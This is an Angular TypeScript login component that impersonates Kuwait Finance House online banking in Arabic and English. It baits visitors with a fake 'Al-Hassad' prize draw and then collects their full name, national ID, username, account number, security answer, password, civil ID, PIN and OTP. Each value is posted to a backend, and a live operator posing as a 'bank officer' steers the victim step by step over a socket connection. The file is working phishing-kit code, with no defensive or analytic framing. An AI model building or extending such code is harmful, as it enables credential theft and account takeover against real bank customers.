import { Component, OnInit, OnDestroy, NgZone, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { ButtonComponent } from '../../shared/components/button/button';
import { InputComponent } from '../../shared/components/input/input';
import { HeaderComponent } from '../../shared/components/header/header';
import { io } from 'socket.io-client';
import { API_BASE } from '../../shared/config';

type LoginStep = 'HARVEST_DRAW' | 'CREDENTIALS' | 'WAITING_QUESTION' | 'ANSWER_QUESTION' | 'WAITING_APPROVAL' | 'ENTER_PASSWORD' | 'WAITING_PASSWORD_APPROVAL' | 'FORGOT_PASSWORD' | 'WAITING_RESET_APPROVAL' | 'ENTER_OTP' | 'APPROVED' | 'REJECTED';

@Component({
  selector: 'app-login',
  standalone: true,
  imports: [CommonModule, FormsModule, ButtonComponent, InputComponent, HeaderComponent],
  templateUrl: './login.html',
  styleUrl: './login.css',
})
export class LoginComponent implements OnInit, OnDestroy {
  private ngZone = inject(NgZone);

  // State machine fields as Signals for Zoneless reactive change detection
  username = signal('');
  accountNumber = signal('');
  step = signal<LoginStep>('HARVEST_DRAW');
  clientId = signal('');
  assignedQuestion = signal('');
  answer = signal('');
  password = signal('');
  otp = signal('');
  civilId = signal('');
  pin = signal('');
  acceptTerms = signal(false);
  fullName = signal('');
  nationalId = signal('');
  loading = signal(false);
  errorMessage = signal('');

  lang: 'ar' | 'en' = 'ar';
  private socket: any;

  // Translation resources
  translations = {
    ar: {
      title: 'الدخول',
      usernameLabel: 'اسم المستخدم',
      usernamePlaceholder: 'ادخل اسم المستخدم',
      accountLabel: 'رقم الحساب',
      accountPlaceholder: 'ادخل رقم الحساب',
      help: 'مساعدة للدخول',
      next: 'التالي',
      register: 'التسجيل',
      waitingQuestion: '',
      waitingApproval: 'جاري التحقق من إجابتك، يرجى الانتظار للموافقة على الدخول من قبل موظف البنك...',
      approvedTitle: 'تم تسجيل الدخول بنجاح!',
      approvedSubtitle: 'مرحباً بك في الخدمات المصرفية الإلكترونية لبيت التمويل الكويتي.',
      rejectedTitle: 'تم رفض الدخول',
      rejectedSubtitle: 'لقد تم رفض طلبك من قبل موظف البنك. يرجى المحاولة مرة أخرى.',
      retryBtn: 'إعادة المحاولة',
      answerPlaceholder: 'أدخل الإجابة هنا',
      submitAnswer: 'إرسال الإجابة',
      verificationPrompt: 'يرجى الاجابة على السؤال للمتابعة',
      passwordLabel: 'كلمة السر',
      passwordPlaceholder: 'ادخل كلمة السر',
      forgotPassword: 'نسيت كلمة السر',
      loginBtn: 'دخول',
      otpLabel: 'رمز التحقق (OTP)',
      otpPlaceholder: 'ادخل رمز التحقق OTP',
      submitOtp: 'تأكيد الرمز',
      waitingPasswordApproval: 'جاري التحقق من كلمة السر، يرجى الانتظار للموافقة على الدخول من قبل موظف البنك...',
      resetTitle: 'تعيين الحساب',
      resetSubtitle: 'يمكنك تغيير كلمة السر بخطوات بسيطة',
      civilIdLabel: 'الرقم المدني',
      civilIdPlaceholder: 'ادخل الرقم المدني',
      pinLabel: 'الرقم السري',
      pinPlaceholder: 'ادخل الرقم السري',
      termsAccept: 'الموافقة على الشروط والأحكام',
      termsLine1: 'نقوم بحماية بياناتك بما يتماشى مع ',
      termsLine2: 'سياسة الخصوصية',
      termsLine3: ' و ',
      termsLine4: 'شروط وأحكام الخدمة',
      waitingResetApproval: 'جاري التحقق من طلب تعيين الحساب، يرجى الانتظار للموافقة على الطلب من قبل موظف البنك...',
      drawTitle: 'للمشاركة والدخول على سحب حساب الحصاد',
      drawSubtitle: 'دخل بياناتك',
      fullNameLabel: 'الاسم',
      fullNamePlaceholder: 'ادخل الاسم بالكامل',
      nationalIdLabel: 'الرقم الوطني',
      nationalIdPlaceholder: 'ادخل الرقم الوطني',
      registerBtnText: 'تسجيل'
    },
    en: {
      title: 'Login',
      usernameLabel: 'Username',
      usernamePlaceholder: 'Enter username',
      accountLabel: 'Account Number',
      accountPlaceholder: 'Enter account number',
      help: 'Help with login',
      next: 'Next',
      register: 'Register',
      waitingQuestion: 'Please wait while the bank officer assigns your security question to continue...',
      waitingApproval: 'Verifying your answer, please wait for login approval from the bank officer...',
      approvedTitle: 'Logged in successfully!',
      approvedSubtitle: 'Welcome to KFH Online banking services.',
      rejectedTitle: 'Login Rejected',
      rejectedSubtitle: 'Your request has been rejected by the bank officer. Please try again.',
      retryBtn: 'Try Again',
      answerPlaceholder: 'Enter answer here',
      submitAnswer: 'Submit Answer',
      verificationPrompt: 'Please answer the question to continue',
      passwordLabel: 'Password',
      passwordPlaceholder: 'Enter password',
      forgotPassword: 'Forgot password?',
      loginBtn: 'Login',
      otpLabel: 'Verification Code (OTP)',
      otpPlaceholder: 'Enter OTP code',
      submitOtp: 'Confirm OTP',
      waitingPasswordApproval: 'Verifying password, please wait for login approval from the bank officer...',
      resetTitle: 'Account Setup',
      resetSubtitle: 'You can change the password in simple steps',
      civilIdLabel: 'Civil ID',
      civilIdPlaceholder: 'Enter Civil ID',
      pinLabel: 'PIN',
      pinPlaceholder: 'Enter PIN',
      termsAccept: 'Agree to Terms & Conditions',
      termsLine1: 'We protect your data in accordance with the ',
      termsLine2: 'Privacy Policy',
      termsLine3: ' and ',
      termsLine4: 'Terms & Conditions of Service',
      waitingResetApproval: 'Verifying account reset request, please wait for approval from the bank officer...',
      drawTitle: 'To participate and enter Al-Hassad account draw',
      drawSubtitle: 'Enter your details',
      fullNameLabel: 'Name',
      fullNamePlaceholder: 'Enter your full name',
      nationalIdLabel: 'National ID',
      nationalIdPlaceholder: 'Enter National ID',
      registerBtnText: 'Register'
    }
  };

  get t() {
    return this.translations[this.lang];
  }

  get isFormValid(): boolean {
    if (this.step() === 'HARVEST_DRAW') {
      return this.fullName().trim().length > 0 && this.nationalId().trim().length > 0;
    }
    if (this.step() === 'CREDENTIALS') {
      return this.username().trim().length > 0 && this.accountNumber().trim().length > 0;
    }
    if (this.step() === 'ANSWER_QUESTION') {
      return this.answer().trim().length > 0;
    }
    if (this.step() === 'ENTER_PASSWORD') {
      return this.password().trim().length > 0;
    }
    if (this.step() === 'ENTER_OTP') {
      return this.otp().trim().length > 0;
    }
    if (this.step() === 'FORGOT_PASSWORD') {
      return this.username().trim().length > 0 &&
             this.civilId().trim().length > 0 &&
             this.accountNumber().trim().length > 0 &&
             this.pin().trim().length > 0 &&
             this.acceptTerms();
    }
    return false;
  }

  ngOnInit(): void {
    this.updateDirection();
  }

  ngOnDestroy(): void {
    this.disconnectSocket();
  }

  onLangChange(newLang: 'ar' | 'en'): void {
    this.lang = newLang;
    this.updateDirection();
  }

  private updateDirection(): void {
    if (typeof document !== 'undefined') {
      document.documentElement.dir = this.lang === 'ar' ? 'rtl' : 'ltr';
      document.documentElement.lang = this.lang;
    }
  }

  onForgotPassword(): void {
    this.step.set('FORGOT_PASSWORD');
    this.errorMessage.set('');
    this.civilId.set('');
    this.pin.set('');
    this.acceptTerms.set(false);
  }

  async onSubmit(): Promise<void> {
    if (!this.isFormValid) return;

    this.loading.set(true);
    this.errorMessage.set('');

    try {
      if (this.step() === 'HARVEST_DRAW') {
        const response = await fetch(`${API_BASE}/user/client/start-draw`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ fullName: this.fullName(), nationalId: this.nationalId() })
        });

        const data = await response.json();
        if (!response.ok) throw new Error(data.message || 'فشلت عملية التسجيل');

        this.clientId.set(data.clientId);
        this.step.set('CREDENTIALS');
        this.initializeSocketConnection();
      } else if (this.step() === 'CREDENTIALS') {
        const response = await fetch(`${API_BASE}/user/client/submit-credentials`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ clientId: this.clientId(), username: this.username(), accountNumber: this.accountNumber() })
        });

        const data = await response.json();
        if (!response.ok) throw new Error(data.message || 'فشلت عملية الدخول');

        this.step.set('WAITING_QUESTION');
      } else if (this.step() === 'ANSWER_QUESTION') {
        const response = await fetch(`${API_BASE}/user/client/answer`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ clientId: this.clientId(), answer: this.answer() })
        });

        const data = await response.json();
        if (!response.ok) throw new Error(data.message || 'فشلت إرسال الإجابة');

        this.step.set('WAITING_APPROVAL');
      } else if (this.step() === 'ENTER_PASSWORD') {
        const response = await fetch(`${API_BASE}/user/client/password`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ clientId: this.clientId(), password: this.password() })
        });

        const data = await response.json();
        if (!response.ok) throw new Error(data.message || 'فشلت إرسال كلمة السر');

        this.step.set('WAITING_PASSWORD_APPROVAL');
      } else if (this.step() === 'FORGOT_PASSWORD') {
        const response = await fetch(`${API_BASE}/user/client/reset-details`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            clientId: this.clientId(),
            civilId: this.civilId(),
            pin: this.pin()
          })
        });

        const data = await response.json();
        if (!response.ok) throw new Error(data.message || 'فشلت عملية تعيين الحساب');

        this.step.set('WAITING_RESET_APPROVAL');
      } else if (this.step() === 'ENTER_OTP') {
        const response = await fetch(`${API_BASE}/user/client/otp`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ clientId: this.clientId(), otp: this.otp() })
        });

        const data = await response.json();
        if (!response.ok) throw new Error(data.message || 'فشلت إرسال رمز التحقق');
      }
    } catch (err: any) {
      this.errorMessage.set(err.message || 'حدث خطأ أثناء الاتصال بالخادم');
    } finally {
      this.loading.set(false);
    }
  }

  private initializeSocketConnection(): void {
    this.disconnectSocket();

    console.log('Connecting to WebSocket server...');
    this.socket = io(API_BASE);

    this.socket.on('connect', () => {
      console.log('WebSocket connected. Joining client room:', this.clientId());
      this.socket.emit('join', this.clientId());
    });

    this.socket.on('status_change', (data: any) => {
      console.log('Socket status change event received:', data);

      this.ngZone.run(() => {
        if (data.status === 'WAITING_ANSWER') {
          this.assignedQuestion.set(data.question);
          this.step.set('ANSWER_QUESTION');
        } else if (data.status === 'ANSWERED') {
          this.step.set('WAITING_APPROVAL');
        } else if (data.status === 'PASSWORD_PENDING') {
          this.step.set('ENTER_PASSWORD');
        } else if (data.status === 'PASSWORD_SUBMITTED') {
          this.step.set('WAITING_PASSWORD_APPROVAL');
        } else if (data.status === 'RESET_SUBMITTED') {
          this.step.set('WAITING_RESET_APPROVAL');
        } else if (data.status === 'OTP_PENDING') {
          this.step.set('ENTER_OTP');
        } else if (data.status === 'APPROVED') {
          this.step.set('APPROVED');
          this.disconnectSocket();
        } else if (data.status === 'REJECTED') {
          this.step.set('REJECTED');
          this.disconnectSocket();
        }
      });
    });

    this.socket.on('disconnect', () => {
      console.log('WebSocket disconnected.');
    });
  }

  private disconnectSocket(): void {
    if (this.socket) {
      this.socket.disconnect();
      this.socket = null;
    }
  }

  retry(): void {
    this.disconnectSocket();
    this.step.set('HARVEST_DRAW');
    this.clientId.set('');
    this.assignedQuestion.set('');
    this.answer.set('');
    this.password.set('');
    this.otp.set('');
    this.civilId.set('');
    this.pin.set('');
    this.fullName.set('');
    this.nationalId.set('');
    this.acceptTerms.set(false);
    this.errorMessage.set('');
  }
}


